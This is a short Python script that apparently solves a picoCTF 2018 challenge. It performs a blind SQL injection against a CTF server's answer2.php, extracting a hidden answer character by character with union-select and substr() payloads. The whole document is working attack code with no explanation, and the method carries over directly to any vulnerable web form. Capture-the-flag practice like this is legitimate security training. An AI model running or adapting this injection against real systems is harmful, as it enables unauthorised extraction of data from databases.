import urllib3
import requests, sys, time

http = urllib3.PoolManager()
allChars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ _!"#$&()*+`-./:;<=>?@[]\\^{}|~'


flag = ""
like = "%"
i = 1
while 1:
	print (allChars[0])
	for char in allChars:
		statement = '\'  union select answer FROM answers where substr(answer,'+str(i)+',1)="'+char+'"-- -'
		r = http.request("POST", "http://2018shell1.picoctf.com:32635/answer2.php", fields={'answer':statement})
		if "close" in r.data.decode():
			flag += char
			i+=1
			print (flag)
			break



